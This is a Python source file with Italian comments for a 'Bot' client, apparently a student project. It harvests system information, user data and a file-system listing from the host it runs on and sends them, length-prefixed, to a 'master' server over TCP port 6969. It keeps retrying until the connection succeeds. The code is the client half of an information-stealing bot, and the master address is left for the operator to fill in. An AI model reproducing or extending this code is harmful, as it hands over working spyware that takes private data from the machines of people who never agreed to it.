import socket
import struct

import systemRetrieval
from time import sleep
import json
import sys
import threading

PORT = 6969
CLIENT = socket.gethostbyname(socket.gethostname())
FORMAT = 'utf-8'
MASTER_ADDRESS = 'localhost'  # Inserire ip del master
SUCCESSFUL_RESPONSE = 'ok'


class Bot:
    def __init__(self):
        self.Scavenger = systemRetrieval.InformationScavanger()

        self.data_sentence = ''
        self.fileSystem_sentence = ''

        self.send_sentence = ''

        self.clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Thread incaricato del recupero dei dati e del calcolo della loro dimensione.
        self.thread_data = threading.Thread(target=self.dataScavange)

        # Thread incaricato dell'effettiva comunicazione con il server.
        self.thread_connection = threading.Thread(target=self.waitForConnection)

        # Thread incaricato del recupero del file system.
        self.thread_fileSystem = threading.Thread(target=self.fileSystemScavange)

        self.thread_data.start()
        self.thread_connection.start()
        self.thread_fileSystem.start()

    def waitForConnection(self):
        """
        Procedura nella quale si descrive la logica della comunicazione tra client e server.
        :return: None
        """

        # Se il client non riesce a connettersi al server, ritenta la connessione dopo 2 secondi.
        while self.clientSocket.connect_ex((MASTER_ADDRESS, PORT)) != 0:
            sleep(2)

        # Ottenuta l'accettazione della richiesta, la comunicazione non avviene finchè thread_data non termina la raccolta dati.
        while self.thread_data.is_alive():
            sleep(2)

        # Possiamo ora inviare i dati raccolti in formato .json.
        self.sendToServer()

        # Il Bot attende la fine del thread file system prima di mandare i dati.
        while self.thread_fileSystem.is_alive():
            sleep(2)

        # Possiamo ora inviare i dati raccolti in formato txt
        self.sendToServer()

        self.clientSocket.close()

        print("thread_connection terminated.")

    def dataScavange(self):
        """
        Procedura tramite la quale il client raccoglie i dati in formato .json e calcola la dimensione totale del pacchetto da inviare.
        :return: None
        """
        inputDict = self.Scavenger.systemRetrieval()
        self.data_sentence = json.dumps(inputDict)

        self.send_sentence = self.data_sentence
        print("thread_data terminated.")

    def fileSystemScavange(self):
        # prende dati user
        userData = self.Scavenger.retriveUser()
        # manda dati user
        self.sendToServer(userData)
        print("User Inviato")
        inputSentence = self.Scavenger.fileSystemRetrival()
        self.fileSystem_sentence = inputSentence
        self.send_sentence = self.fileSystem_sentence
        print("thread_fileSystem terminated.")

    def sendToServer(self, data=''):
        """
        Il client invia al server i dati raccolti in formato .json.
        :parameter data eventuale dato da inviare, altrimenti invia la send sentence della classe
        :return: None
        """
        if data == '':
            send_data = self.send_sentence
        else:
            send_data = data

        try:
            print(sys.getsizeof(send_data.encode(FORMAT)))
            self.send_message(send_data.encode(FORMAT))
        except BrokenPipeError as error:
            print(error)

    # TODO: dobbiamo affrontare il problema dell'invio del filesystem dato che le funzioni di send e recv sono cambiate
    def send_message(self, msg):
        msg = struct.pack('>I', len(msg)) + msg
        self.clientSocket.sendall(msg)


if __name__ == '__main__':
    client = Bot()
